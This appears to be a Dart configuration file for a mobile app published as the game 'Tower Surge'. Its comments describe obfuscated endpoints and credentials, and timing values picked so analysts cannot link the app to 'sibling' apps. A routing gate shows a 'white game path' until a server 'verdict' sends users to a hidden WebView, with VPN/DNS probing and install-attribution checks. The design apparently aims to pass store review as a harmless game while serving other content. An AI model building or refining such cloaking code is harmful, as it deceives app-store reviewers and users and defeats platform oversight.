import 'mask/masked_ledger.dart';

// ============================================================
// HARBOR CONFIG — single source of truth for identity + timings
// ============================================================
// Identity constants ship as plain strings (they appear on the store
// listing anyway, so encoding them would only look suspicious).
// Every credential / URL / UA fragment resolves lazily through
// `unwrap*` accessors so the compiled binary carries only the encoded
// bytes.
//
// Timing values live outside the ranges every shipped sibling uses,
// so an obfuscated dump cannot cluster this app with any other by
// scanning for the well-known constants.
// ============================================================

abstract final class HarborConfig {
  // ── Identity — matches the Play Console listing ─────────────
  static const String applicationId = 'com.surgefort.towersurgegame';
  static const String marketId = 'com.surgefort.towersurgegame';
  static const String displayName = 'Tower Surge';

  /// Numeric iOS App Store id — empty on Android-only shipments.
  static const String storeNumericId = '';

  // ── Timings — every constant sits inside a documented range ──
  //
  // Ranges come from .cursor/rules/relay_forge.md. Do NOT hand-edit
  // to a "round" value — round numbers cluster across apps.

  /// Snooze for the push-permission stage when the user chose Skip.
  /// Range: 172800..604800 (2..7 days). Value here: 3 days.
  static const int permissionSnoozeSeconds = 259200;

  /// Delay before AppsFlyer's Organic-false-positive rescue call.
  /// Range: 4..12 seconds.
  static const int organicRescueDelay = 9;

  /// Verdict POST timeout. Range: 10..25 seconds.
  static const int rulingTimeoutSeconds = 21;

  /// Wait for the install-conversion payload on first launch.
  /// Range: 20..40 seconds.
  static const int firstInstallAwaitSeconds = 33;

  /// Wait for the install-conversion payload on a returning launch.
  /// Range: 3..10 seconds.
  static const int returningInstallAwaitSeconds = 8;

  /// Deep-link callback wait. Range: 3..8 seconds.
  static const int deepLinkAwaitSeconds = 6;

  /// DNS probe timeout — 4..9 seconds. VPN tunnels routinely need
  /// 4–5 seconds even on healthy connections; keep this at 7 s.
  static const int dnsProbeTimeoutSeconds = 7;

  /// Debounce for a connectivity-drop signal before routing to
  /// offline. Range: 500..1200 ms.
  static const int dropDebounceMs = 940;

  /// Redirect-loop retries inside the WebView on errors -1007 / -9.
  /// Range: 1..5.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness window in seconds.
  /// Range: 259200..1209600 (3..14 days). Value here: 8 days.
  static const int cachedUrlLifetimeSeconds = 8 * 24 * 60 * 60;

  // ── Resolved encoded endpoints & credentials ────────────────
  static String get endpointUrl => unwrapEndpoint();
  static String get attributionKey => unwrapAttribution();
  static String get messagingProject => unwrapMessagingProject();

  static String get storeIdentifier {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// Routing gate — stays closed (native game only) until every
  /// operator-supplied credential has been minted into the masked
  /// ledger. Intentional: it lets QA smoke-test the white game path
  /// before the backend is wired up.
  static bool get harborReady =>
      endpointUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProject.isNotEmpty;
}
